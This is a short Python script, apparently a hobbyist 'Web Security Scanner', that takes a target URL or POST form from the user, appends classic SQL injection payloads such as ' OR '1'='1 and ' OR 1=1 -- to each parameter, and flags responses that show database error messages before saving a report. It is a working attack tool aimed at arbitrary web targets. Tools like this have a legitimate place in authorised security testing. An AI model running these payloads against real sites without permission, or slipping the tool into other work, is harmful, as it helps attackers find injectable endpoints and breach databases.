import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime

SQL_PAYLOADS = [
    "'", "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", "' OR 'a'='a", "' OR 1=1#"
]

SQL_ERRORS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark",
    "quoted string not properly terminated"
]

def is_vulnerable(response_text):
    return any(error in response_text for error in SQL_ERRORS)

def inject_get(url, payload):
    parsed_url = urlparse(url)
    query = parse_qs(parsed_url.query)
    results = []

    for key in query:
        original = query[key][0]
        query[key][0] = original + payload
        new_query = urlencode(query, doseq=True)
        new_url = urlunparse(parsed_url._replace(query=new_query))

        try:
            response = requests.get(new_url, timeout=5)
            if is_vulnerable(response.text):
                msg = f"[!!] GET Vulnerable with payload: {payload} | URL: {new_url}"
                print(msg)
                results.append(msg)
        except requests.RequestException as e:
            print(f"[Error] Failed to connect: {e}")

        query[key][0] = original 

    return results

def inject_post(url, data, payload):
    results = []
    for key in data:
        original = data[key]
        data[key] = original + payload
        try:
            response = requests.post(url, data=data, timeout=5)
            if is_vulnerable(response.text):
                msg = f"[!!] POST Vulnerable with payload: {payload} | Param: {key}"
                print(msg)
                results.append(msg)
        except requests.RequestException as e:
            print(f"[Error] Failed to connect: {e}")
        data[key] = original  # Reset value
    return results

def write_report(results):
    filename = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, "w") as f:
        f.write("\n".join(results))
    print(f"\n[*] Report saved to: {filename}")

def start_scan():
    print("=== Web Security Scanner ===")
    mode = input("Choose mode [get/post]: ").strip().lower()

    if mode == "get":
        url = input("Enter the target URL with parameters (e.g. ?id=1):\n> ").strip()
        if "?" not in url or "=" not in url:
            print("[!] Invalid URL format. Example: http://site.com/page.php?id=1")
            return
        all_results = []
        for payload in SQL_PAYLOADS:
            print(f"[*] Trying payload: {payload}")
            all_results += inject_get(url, payload)
        write_report(all_results)

    elif mode == "post":
        url = input("Enter the target URL (POST endpoint):\n> ").strip()
        raw = input("Enter POST data (e.g. username=admin&password=123):\n> ")
        try:
            data = dict(item.split("=") for item in raw.split("&"))
        except:
            print("[!] Invalid data format.")
            return
        all_results = []
        for payload in SQL_PAYLOADS:
            print(f"[*] Trying payload: {payload}")
            all_results += inject_post(url, data.copy(), payload)
        write_report(all_results)

    else:
        print("[!] Invalid mode. Choose either 'get' or 'post'.")

if __name__ == "__main__":
    start_scan()